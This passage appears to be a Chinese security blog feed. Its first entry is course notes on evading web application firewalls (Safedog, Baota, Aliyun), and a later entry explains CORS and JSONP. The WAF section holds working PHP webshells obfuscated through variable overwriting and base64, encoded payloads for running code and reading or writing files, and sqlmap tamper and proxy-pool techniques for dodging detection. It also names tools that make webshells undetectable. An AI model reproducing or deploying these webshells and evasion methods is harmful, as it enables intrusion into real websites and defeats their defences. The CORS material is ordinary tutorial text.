'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
'Cookie': 'PHPSESSID=99d6a382f03de62bb8f51ba51e51550f',#根据当前访问 cookie
}

for paths in open('php_b.txt',encoding='utf-8'):
url='http://192.168.0.109:8890/'
paths=paths.replace('\n','')
urls=url+paths
#如需测试加代理，或加入代理池需加代理
proxy = {
'http': '127.0.0.1:7777'
}
try:
code=requests.get(urls,headers=headers,verify=False).status_code
print(urls+'|'+str(code))
if code==200 or code==403:
print(urls+'|'+str(code))
except Exception as err:
print('connecting error')
#time.sleep(3)模拟用户需延时 引擎可用可不用（根据请求速度
</code></pre>
<p>涉及资源<br>
https://www.bt.cn/<br>
http://free.safedog.cn/website_safedog.html<br>
https://www.cnblogs.com/iack/p/3557371.html</p>
<p><strong>47.W漏洞发现之代理池指纹被动探针</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093509448.png" alt="" loading="lazy"><br>
<strong>47.1 漏洞发现触发 WAF 点-针对 xray,awvs 等</strong><br>
1.扫描速度-(代理池，延迟，白名单等)<br>
2.工具指纹-(特征修改，伪造模拟真实用户等)<br>
3.漏洞 Payload-(数据变异，数据加密，白名单等)</p>
<p><strong>47.2 案例演示</strong><br>
代理池 Proxy_pool 项目搭建及使用解释</p>
<p><strong>案例1：代理池Proxy_pool项目搭建及使用解释</strong></p>
<p>Proxy_pool免费，但是不适用于waf绕过，因为它是抓取网上各种代理平台提供的免费代理，免费代理存活时间短，成功率随机，稳定性差。</p>
<p>1.Proxy_pool下载（地址：https://github.com/jhao104/proxy_pool），安装库文件，修改setting.py文件</p>
<pre><code>HOST = &quot;127.0.0.1&quot;

DB_CONN = 'redis://:@127.0.0.1:6379/0'
</code></pre>
<p>2.下载并安装Redis-x64-3.2.100.msi，地址：https://github.com/MicrosoftArchive/redis/releases。</p>
<p>安装完成后，启动服务（找到安装路径，双击redis-cli.exe文件即可，或者在计算机管理-服务 处启动）</p>
<p>3.Redis可视化工具Redis Desktop Manager下载（http://pan.baidu.com/s/1kU8sY3P），安装，连接。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094164164.jpg" alt="" loading="lazy"><br>
4.启动调度程序即可抓到代理，命令：python proxyPool.py schedule<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094168888.jpg" alt="" loading="lazy"></p>
<p>5.启动webApi服务即可通过web api查看代理。</p>
<p>启动命令：python proxyPool.py server</p>
<p>查看：http://127.0.0.1:5010/get/<br>
Redis Desktop Manager中查看<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094175121.png" alt="" loading="lazy"></p>
<p><strong>充钱代理池直接干 safedog+BT+Aliyun 探针</strong></p>
<p>免费代理不好用，那我们就买代理，建议选择隧道代理，每次请求换IP。<br>
快代理：https://www.kuaidaili.com/</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636094179586.jpg" alt="" loading="lazy"><br>
使用上次的脚本，配置收费代理。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094184041.jpg" alt="" loading="lazy"></p>
<p><strong>Safedog-awvs 漏扫注入测试绕过-延时,白名单</strong></p>
<p>使用网站：【http://httpbin.org/ip】检测访问其他网站的原始ip是哪个</p>
<p>awvs扫描sqli-labs（绕过安全狗），设置最低速或者修改AWVS指纹头</p>
<figure data-type="image" tabindex="121"><img src="https://jinqipiaopiao.github.io//post-images/1636094189769.jpg" alt="" loading="lazy"></figure>
<p><strong>Aliyun_os-awvs 漏扫注入测试绕过-延时白名单</strong></p>
<p>注意：不是每个工具都可以控制扫描速度和改变指纹头，比如xray貌似就不行。</p>
<p>此时，可以对工具使用代理，将数据包发送到burpsuite上，人为的对每个数据包点击放行（太麻烦了吧），以控制速度。也可以自己写个鼠标点击器，代替人为点击。</p>
<p>对于漏洞payload触发WAF这种情况，我们怎么绕过呢？</p>
<p>我们举个例子，由于每个工具判断注入点的方式不同，假设awvs通过and 1=1判断注入，xray通过or 1=1判断注入，那么当waf对and 1=1进行拦截时，我们就不能使用awvs来扫描了，因为扫描不出结果，但是我们可以换xray扫描，这样就绕过了waf拦截，所以实际操作时，我们可以多换几个工具进行扫描。（方法1）</p>
<p>此外还可以使用冷门扫描工具，因为工具冷门，所以漏洞验证和指纹都不会被WAF采集到，可以绕过。（方法2）</p>
<p>使用开源的或者自己编写的工具扫描时，可以针对触发WAF点进行数据变异，从而绕过拦截。（方法3）</p>
<p><strong>BT(baota)-awvs+xray 漏扫 Payload 绕过-延时被动</strong></p>
<p>awvs扫描，配置代理，将数据包发送到burp，burp配置代理，将数据包发送给xray，实现三者联动。</p>
<p>此时如果awvs控制了扫描速度，那么xray也会被动延时。</p>
<figure data-type="image" tabindex="122"><img src="https://jinqipiaopiao.github.io//post-images/1636094201396.jpg" alt="" loading="lazy"></figure>
<p><strong>充钱代理池直接干 Safedog+BT+AliyunOS 漏洞发现</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636094208016.jpg" alt="" loading="lazy"></p>
<p>涉及资源<br>
http://httpbin.org/<br>
https://www.kuaidaili.com/<br>
https://github.com/jhao104/proxy_pool</p>
<p><strong>48.权限控制之代码混淆及行为造轮子</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093522129.png" alt="" loading="lazy"><br>
<strong>48.1 Safedog&amp;宝塔代码层手写及脚本绕过</strong><br>
变量覆盖，加密混淆，异或生成<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093533648.png" alt="" loading="lazy"></p>
<pre><code>127.0.0.1:8081/1.php?x=b;y=assert post:z=phpinfo 这种传输形式宝塔会拦截
</code></pre>
<figure data-type="image" tabindex="123"><img src="https://jinqipiaopiao.github.io//post-images/1636093528736.png" alt="" loading="lazy"></figure>
<p>在脚本里把接收的参数加密可绕过，把phpinfo()采用base64加密形式传输</p>
<pre><code>&lt;?php
$a=$_GET['x'];
$$a=$_GET['y'];
#$b($_POST['z']); 宝塔会拦截
$b(base64_decode($_POST['z']));
?&gt;

http://192.168.206.132:8082/`1.php?x=b&amp;y=assert`
#z=phpinfo();
z=cGhwaW5mbygpOw==
//传参：?x=b&amp;y=assert
//$a=b  $$a=assert=$b assert($_POST['z']);

可以绕过safedog查杀

上传成功后，
访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
并且(可以用hackbar插件)postdata:z=phpinfo();

safedog不拦截
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636093544651.png" alt="" loading="lazy"><br>
异或生成<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093553086.png" alt="" loading="lazy"></p>
<p><strong>48.2 BT Aliyun 代码层手写及脚本绕过</strong><br>
编码解码(变量覆盖，加密混淆，异或生成)ASP,PHP,ASPX,JSP,PY 等后门免杀同理</p>
<pre><code>http://test.xiaodi8.com/x.php?id=x
mr6=cGhwaW5mbygpOw==
http://test.xiaodi8.com/xx.php?x=b&amp;y=assert
z=cGhwaW5mbygpOw== 执行代码
z=ZmlsZV9wdXRfY29udGVudHMoInRlc3QudHh0IiwiMSIpOw== 写入文件
z=dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs= 读取文件
</code></pre>
<p><strong>48.3 菜刀，蚁剑，冰蝎优缺点</strong><br>
菜刀：未更新状态，无插件，单向加密传输<br>
蚁剑：更新状态，有插件，拓展性强，单向加密传输<br>
冰蝎：更新状态，未知插件，双向加密传输<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093558580.png" alt="" loading="lazy"><br>
演示案例：<br>
<strong>Safedog-手写覆盖变异简易代码绕过-代码层</strong></p>
<pre><code>一句话木马：&lt;?php assert($_POST['chopper']);?&gt;
</code></pre>
<p>变量覆盖：通过把敏感字符写到参数上，绕过WAF：</p>
<pre><code>&lt;?php
$a=$_GET['x'];
$$a=$_GET['y'];
$b($_POST['z']);
?&gt;

//传参：?x=b&amp;y=assert
//$a=b  $$a=assert=$b assert($_POST['z']);

可以绕过safedog查杀

上传成功后，
访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
并且(可以用hackbar插件)postdata:z=phpinfo();

safedog不拦截
</code></pre>
<p>测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095006090.jpg" alt="" loading="lazy"></p>
<p><strong>Safedog-基于接口类加密混淆代码绕过-代码层</strong><br>
采取上述覆盖变量的方式可以绕过安全狗查杀，但是会被宝塔拦截。原因是 宝塔过滤规则里定义了phpinfo()等关键字<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095010887.png" alt="" loading="lazy"><br>
所以可以配套 使用编码解码方式 绕过 宝塔。</p>
<pre><code>一句话木马：&lt;br&gt;&lt;?php
$a=$_GET['x'];
$$a=$_GET['y'];
$b(base64_decode($_POST['z']));
?&gt;

上传成功后，
访问：http://127.0.0.1:8081/x/1.php?x=b&amp;y=assert
并且(可以用hackbar插件)postdata:z=cGhwaW5mbygpOw==
</code></pre>
<figure data-type="image" tabindex="124"><img src="https://jinqipiaopiao.github.io//post-images/1636095018940.png" alt="" loading="lazy"></figure>
<p><strong>BT,Aliyun-基于覆盖加密变异下编码解码绕过-代码层</strong><br>
上传一句话木马：</p>
<pre><code>&lt;?php assert(base64_decode($_POST['chopper']));?&gt;
</code></pre>
<p>木马文件被安全狗查杀<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095025311.png" alt="" loading="lazy"><br>
访问被安全狗拦截<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095029627.png" alt="" loading="lazy"><br>
可以采用加密混淆的方法绕过</p>
<p><strong>方法1：使用enPHP工具加密混淆代码</strong></p>
<pre><code>enPHP：一个开源加密混淆 PHP 代码项目

源码地址：https://github.com/djunny/enphp（工具已被删除）
命令：php.exe code_test.php

在线地址：http://enphp.djunny.com/（貌似也用不了？）
</code></pre>
<p>加密混淆后木马：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095035018.png" alt="" loading="lazy"><br>
测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095040092.png" alt="" loading="lazy"><br>
<strong>方法2：phpjiami在线加密混淆</strong></p>
<p>地址：https://www.phpjiami.com/phpjiami.html</p>
<p>木马加密前后对比：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095046111.png" alt="" loading="lazy"><br>
成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095052011.png" alt="" loading="lazy"><br>
<strong>案例4：safedog,BT,Aliyun-基于覆盖加密变异下编码解码绕过-代码层</strong></p>
<p>venom：支持生成asp、aspx、jsp、php等一句话免杀木马</p>
<p>下载：https://pan.baidu.com/s/1msqO2kps139NNP9ZEIAVHw 提取码：xiao<br>
这个项目原来在github上，后来被移除了。发现gitee上也有Webshell-venom，<br>
地址：https://gitee.com/Dyan_code/webshell-venom?_from=gitee_search</p>
<pre><code>## 使用方法
```
python3 php_venom_3.3.py    //生成免杀一句话
    
python3 php_venom_3.3.py shell.php   //对同目录下shell.php进行免杀处理，结果保存在shell.php.bypass.php
```
    
## 3.x 使用说明：

是否传入id参数决定是否把流量编码

```
http://www.xxx.com/shell.php 
POST: mr6=phpinfo();  //与普通shell相同

http://www.xxx.com/shell.php?id=xxx(xxxx随便修改)
POST: mr6=cGhwaW5mbygpOwo=  //payload的base64编码
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095059217.png" alt="" loading="lazy"><br>
测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095065591.png" alt="" loading="lazy"></p>
<p><strong>Safedog,BT,Aliyun-基于冰蝎新型控制器绕过全面测试-行为层</strong></p>
<p>3个工具比较：</p>
<p>菜刀：已经不再更新了，无插件（看举例1），单向加密传输，打5分，不建议使用。<br>
蚁剑：持续更新状态，有插件，扩展性强，缺点是单向加密传输，打8分。<br>
冰蝎：持续更新状态，未知插件，扩展性强，双向加密传输，偏向于后渗透，可以联动msf.，打分9分，推荐使用。<br>
下载地址：</p>
<p>冰蝎：https://github.com/rebeyond/Behinder/releases/<br>
蚁剑：https://github.com/AntSwordProject/antSword/releases</p>
<p>举例1：菜刀工具没有base64编码解码功能，所以就无法通过编码绕过宝塔，但是蚁剑可以，如下图所示。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095070501.png" alt="" loading="lazy"></p>
<p>单向加密传输VS双向加密传输：</p>
<p>单向加密传输：请求参数加密，响应不加密。<br>
双向加密传输：请求加密，响应加密，更好地保护数据传输，防止waf拦截被杀。<br>
冰蝎双向加密传输原理：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095076348.png" alt="" loading="lazy"></p>
<p>冰蝎-双向加密传输-抓包查看<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095082043.png" alt="" loading="lazy"></p>
<p><strong>Safedog,BT,Aliyun-基于手写新型控制器绕过全面测试-行为层</strong><br>
使用工具连接木马时，waf可能会通过工具的指纹实现拦截，此时我们可以采用如下方法绕过：1、指纹变异、2、自己造轮子</p>
<p>举例如下，自己写脚本模拟工具</p>
<pre><code>http://test.xxx.com/xx.php?x=b&amp;y=assert
post data举例：
执行代码 z=phpinfo(); --&gt;  z=cGhwaW5mbygpOw==
写入文件 z=file_put_contents(&quot;test.txt&quot;,&quot;1&quot;); --&gt;  z=ZmlsZV9wdXRfY29udGVudHMoInRlc3QudHh0IiwiMSIpOw==
读取文件 z=var_dump(scandir(&quot;.&quot;)); --&gt;  z=dmFyX2R1bXAoc2NhbmRpcigiLiIpKTs=
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095089441.png" alt="" loading="lazy"><br>
测试，成功。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095096194.png" alt="" loading="lazy"><br>
涉及其他资源：</p>
<p>1、wsexplorer抓包工具<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095101787.png" alt="" loading="lazy"></p>
<p>2、超级加解密转换工具<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095106138.png" alt="" loading="lazy"></p>
<p>涉及资源<br>
https://github.com/djunny/enphp<br>
https://www.phpjiami.com/phpjiami.html<br>
https://github.com/rebeyond/Behinder/releases/<br>
https://github.com/AntSwordProject/antSword/releases</p>
<p><strong>49.漏洞利用注入上传跨站等绕过</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1636093563436.png" alt="" loading="lazy"><br>
** 49.1 SQL 注入**<br>
如需 sqlmap 注入 修改 us 头及加入代理防 CC 拦截自写 tamper 模块<br>
安全狗：参考之前 payload<br>
Aliyun：基本修改指纹即可<br>
宝塔：匹配关键字外加/*等<br>
如需sqlmap注入测试，</p>
<p>防cc拦截：修改user-agent头+代理（付费代理池）<br>
修改user-agent头：<br>
（1）加参数：--random-agent<br>
（2）加参数：--user-agent=&quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;<br>
各大搜索引擎的User-Agent：https://www.cnblogs.com/iack/p/3557371.html<br>
（3）修改配置文件sqlmap.conf中的agent变量值<br>
加代理：--proxy=&quot;http:tps123.kdlapi.com:15818&quot;<br>
绕过安全狗：自写tamper模块，参考如下waf-dog.py<br>
绕过Aliyun：基本修改指纹即可（修改user-agent头）<br>
绕过宝塔：匹配关键字外加/*等</p>
<figure data-type="image" tabindex="125"><img src="https://jinqipiaopiao.github.io//post-images/1636093568217.png" alt="" loading="lazy"></figure>
<pre><code>python sqlmap.py -u &quot;http://test.xiaodi8.com/sqlilabs/Less-2/?id=1&quot; --proxy=&quot;http:tps123.kdlapi.com:15818&quot; --tamper=&quot;waf-dog.py&quot; --random-agent
</code></pre>
<p>waf-dog.py：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095492228.jpg" alt="" loading="lazy"><br>
在买了宝塔付费产品后，过狗的payload中含有/*的都会被宝塔拦截。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095483018.png" alt="" loading="lazy"><br>
可以使用%00截断来绕过。</p>
<p>修改脚本，在使用/*的时候在前面加上%00<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095476384.png" alt="" loading="lazy"><br>
另外，抓包查看sqlmap的指纹如下，会被waf拦截，所以需要修改us头。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1636095468936.png" alt="" loading="lazy"></p>
<p><strong>49.2 文件上传</strong><br>
1.php 截断 参考前面上传 waf 绕过 payload</p>
<p><strong>49.3 XSS 跨站</strong><br>
利用 XSStrike 绕过 加上–timeout 或–proxy 绕过 cc</p>
<p><strong>49.4 其他集合</strong><br>
RCE<br>
加密加码绕过？算法可逆？关键字绕过？提交方法？各种测试！</p>
<pre><code>txt=$y=str_replace('x','','pxhpxinxfo()');assert($y);&amp;submit=%E6%8F%90%E4%BA%A4

文件包含：没什么好说的就这几种
…\ …/ …\
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1636095460893.jpg" alt="" loading="lazy"><br>
————————————————<br>
版权声明：本文为CSDN博主「进击的网安攻城狮」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_41665162/article/details/119827651</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[暑假学习笔记记录]]></title>
        <id>https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/</id>
        <link href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">
        </link>
        <updated>2021-07-05T23:28:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="2021-07-06">2021-07-06:</h1>
<h1 id="cors详解">CORS详解</h1>
<p>CORS是一个W3C标准，全称是跨域资源共享<br>
它允许浏览器向跨源夫区其发乎XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制<br>
一。简介<br>
CORS需要和浏览器和服务器同时支持，目前，所有浏览器都支持该功能，IE浏览器不能低于IE10<br>
整个CORS通信过程，都是刘阿龙年起自动完成，不需要用户参与，对于开发者来说，CORS同行与与同源的AJAX通信没有差别，代码完全一样，浏览器一旦法相ajax请求跨源，就会子哦对那个添加一些附加的头星系，有时还会多出一次附加的请求，但用户不会有感觉，<br>
因此实现cors通信的关键是服务器，只要服务器实现了cors接口，就可以实现跨源通信<br>
二。两种请求<br>
浏览器将cors请求分成两类，简单请求和非简单请求<br>
只要同时满足以下两大条件就属于简单请求<br>
1）请求方法是一下三种方法之一：<br>
HEAD<br>
GET<br>
POST<br>
2）HTTP的头信息不超过一下几种字段：<br>
Accept<br>
Accept-Language<br>
Content-Language<br>
Last-Event-ID<br>
Content-Type：只限于三个值application/x-www-form-urlencoded,multipart/form-data,text/plain<br>
这是为了兼容表单，因为历史上表单一直可以发出跨域请求，AJAX的跨域设计就是，只要表单可以发，AJAX就可以直接发<br>
凡是不满足两个条件的是属于非简单请求<br>
浏览器对这两种请求的处理，是不一样的<br>
三，简单请求<br>
3.1<strong>基本流程</strong><br>
对于简单请求，浏览器直接发出cors请求，具体来说，就是在头信息之中增加一个orign字段<br>
下面是一个例子，浏览器发现这次跨源AJAX请求时简单请求就自动在头信息之中添加一个Origin字段</p>
<pre><code>GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
</code></pre>
<p>上面的头信息中，Origin字段来说明本次请求来自哪个源（协议+域名+端口），服务器根据这个值来决定是否同意这次请求<br>
如果Origin指定的源，不子啊许可范围内，服务器就会返回一个正常的HTTP回应，浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获，这种错误无法通过状态之别，因为HTTP回应的状态码可能是200<br>
如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<p>Access-Control-Allow-Origin: http://api.bob.com<br>
Access-Control-Allow-Credentials: true<br>
Access-Control-Expose-Headers: FooBar<br>
Content-Type: text/html; charset=utf-8<br>
上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。</p>
<p>（1）Access-Control-Allow-Origin</p>
<p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</p>
<p>（2）Access-Control-Allow-Credentials</p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>
<p>（3）Access-Control-Expose-Headers</p>
<p>该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。</p>
<p>3.2 <strong>withCredentials 属性</strong><br>
上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。</p>
<p>Access-Control-Allow-Credentials: true<br>
另一方面，开发者必须在AJAX请求中打开withCredentials属性。</p>
<p>var xhr = new XMLHttpRequest();<br>
xhr.withCredentials = true;<br>
否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
<p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</p>
<p>xhr.withCredentials = false;<br>
需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p>
<p>四、非简单请求<br>
<strong>4.1 预检请求</strong><br>
非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。</p>
<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。</p>
<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</p>
<p>下面是一段浏览器的JavaScript脚本。</p>
<p>var url = 'http://api.alice.com/cors';<br>
var xhr = new XMLHttpRequest();<br>
xhr.open('PUT', url, true);<br>
xhr.setRequestHeader('X-Custom-Header', 'value');<br>
xhr.send();<br>
上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。</p>
<p>OPTIONS /cors HTTP/1.1<br>
Origin: http://api.bob.com<br>
Access-Control-Request-Method: PUT<br>
Access-Control-Request-Headers: X-Custom-Header<br>
Host: api.alice.com<br>
Accept-Language: en-US<br>
Connection: keep-alive<br>
User-Agent: Mozilla/5.0...<br>
&quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</p>
<p>除了Origin字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</p>
<p>（1）Access-Control-Request-Method</p>
<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p>
<p>（2）Access-Control-Request-Headers</p>
<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p>
<p><strong>4.2 预检请求的回应</strong><br>
服务器收到&quot;预检&quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。</p>
<p>HTTP/1.1 200 OK<br>
Date: Mon, 01 Dec 2008 01:15:39 GMT<br>
Server: Apache/2.0.61 (Unix)<br>
Access-Control-Allow-Origin: http://api.bob.com<br>
Access-Control-Allow-Methods: GET, POST, PUT<br>
Access-Control-Allow-Headers: X-Custom-Header<br>
Content-Type: text/html; charset=utf-8<br>
Content-Encoding: gzip<br>
Content-Length: 0<br>
Keep-Alive: timeout=2, max=100<br>
Connection: Keep-Alive<br>
Content-Type: text/plain<br>
上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<p>Access-Control-Allow-Origin: *<br>
如果服务器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</p>
<p>XMLHttpRequest cannot load http://api.alice.com.<br>
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.<br>
服务器回应的其他CORS相关字段如下。</p>
<p>Access-Control-Allow-Methods: GET, POST, PUT<br>
Access-Control-Allow-Headers: X-Custom-Header<br>
Access-Control-Allow-Credentials: true<br>
Access-Control-Max-Age: 1728000<br>
（1）Access-Control-Allow-Methods</p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</p>
<p>（2）Access-Control-Allow-Headers</p>
<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</p>
<p>（3）Access-Control-Allow-Credentials</p>
<p>该字段与简单请求时的含义相同。</p>
<p>（4）Access-Control-Max-Age</p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<p><strong>4.3 浏览器的正常请求和回应</strong><br>
一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。</p>
<p>下面是&quot;预检&quot;请求之后，浏览器的正常CORS请求。</p>
<p>PUT /cors HTTP/1.1<br>
Origin: http://api.bob.com<br>
Host: api.alice.com<br>
X-Custom-Header: value<br>
Accept-Language: en-US<br>
Connection: keep-alive<br>
User-Agent: Mozilla/5.0...<br>
上面头信息的Origin字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<p>Access-Control-Allow-Origin: http://api.bob.com<br>
Content-Type: text/html; charset=utf-8<br>
上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。</p>
<p>五、与JSONP的比较<br>
CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h1 id="jsonp跨域原理解析">jsonp跨域原理解析</h1>
<p>背景：<br>
由于浏览器同源策略的限制，非同源下的请求，都会产生跨域问题，jsonp即是为了解决这个问题出现的一种简便解决方案。</p>
<p>同源策略即：同一协议，同一域名，同一端口号。当其中一个不满足时，我们的请求即会发生跨域问题。</p>
<p>举个简单的例子：</p>
<p>http://www.abc.com:3000到https://www.abc.com:3000的请求会出现跨域（域名、端口相同但协议不同）<br>
http://www.abc.com:3000到http://www.abc.com:3001的请求会出现跨域（域名、协议相同但端口不同）<br>
http://www.abc.com:3000到http://www.def.com:3000的请求会出现跨域（域名不同）<br>
突破同源策略限制：<br>
现在知道了同源策略，那我们就来看下jsonp是如何突破同源策略的限制实现跨域的</p>
<p>首先，不知道大家有没有注意，不管是我们的script标签的src还是img标签的src，或者说link标签的href他们没有被同源策略所限制，比如我们有可能使用一个网络上的图片，就可以请求得到</p>
<pre><code>&lt;img src=&quot;https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/image/h%3D300/sign=6d0bf83bda00baa1a52c41bb7711b9b1/0b55b319ebc4b745b19f82c1c4fc1e178b8215d9.jpg&quot;&gt;
</code></pre>
<p>src或href链接的静态资源，本质上来说也是一个get请求，拿csdn上的静态资源举例：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625536762106.png" alt="" loading="lazy"><br>
可以看到，确实是个get请求无疑。同理img标签的src和link标签的href也会发送一个get请求去请求静态资源。那么我们通过这点，是不是发现了点什么，这些标签的src和link属性，并没有受同源策略的限制。说到这里jsonp的实现原理就浮出水面了。</p>
<p>jsonp就是使用同源策略这一“漏洞”，实现的跨域请求（这也是jsonp跨域只能用get请求的原因所在）。想象一下，既然是个get请求，那么服务端一定可以接收到，并做出反馈。ok，知道这两点之后，我们开始具体使用jsonp进行跨域请求。</p>
<p>JSONP跨域实现：<br>
根据上边所说的，我们要用过利用srcipt标签的src属性来实现，那么我们如何做呢，我们来看一段简单的代码，为了方便，我这里使用jQuery：</p>
<pre><code>$('#btn').click(function(){
		var frame = document.createElement('script');
		frame.src = 'http://localhost:3000/article-list?name=leo&amp;age=30&amp;callback=func';
		$('body').append(frame);
	});
</code></pre>
